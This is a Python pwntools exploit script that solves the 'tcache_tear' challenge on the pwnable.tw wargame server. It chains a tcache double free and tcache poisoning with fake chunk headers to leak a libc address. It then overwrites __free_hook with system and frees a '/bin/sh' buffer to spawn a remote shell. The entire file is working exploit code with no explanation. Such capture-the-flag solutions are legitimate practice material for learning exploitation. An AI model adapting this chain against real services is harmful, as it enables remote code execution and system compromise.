#!/usr/bin/env python3

from pwn import *

elf = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = elf
#p = elf.process()
p = remote("chall.pwnable.tw", 10207)
raw_input("DEBUG")
index = 0

def malloc(size, data):
    global index    
    p.sendlineafter("Your choice :",b"1")
    p.sendlineafter("Size:",str(size).encode())
    p.sendlineafter("Data:",data)
    index += 1
    return index - 1

def free():
    p.sendlineafter("Your choice :",b"2")    

p.sendlineafter("Name:", b"")
malloc(0x70,b"A"*8)
free()
free()

malloc(0x70,p64(0x602550))
malloc(0x70,b"B"*8)
malloc(0x70, p64(0)+p64(0x21)+p64(0) +p64(0) +p64(0) +p64(0x21))

malloc(0x60,b"A"*8)
free()
free()

malloc(0x60,p64(0x602050))
malloc(0x60,b"B"*8)
malloc(0x60, p64(0)+p64(0x501) +p64(0) +p64(0) +p64(0)*3 +p64(0x602060))

free()

p.sendlineafter("Your choice :",b"3") 
p.recvuntil("Name :")
libc.address = u64(p.recv(6).ljust(8,b"\x00"))-0x3EBCA0
log.info("Libc base: "+hex(libc.address))

malloc(0x80, b"D"*8)
free()
free()

malloc(0x80, p64(libc.sym.__free_hook))
malloc(0x80, b"D"*8)
malloc(0x80, p64(libc.sym.system))

malloc(0x30, "/bin/sh")

free()


p.interactive()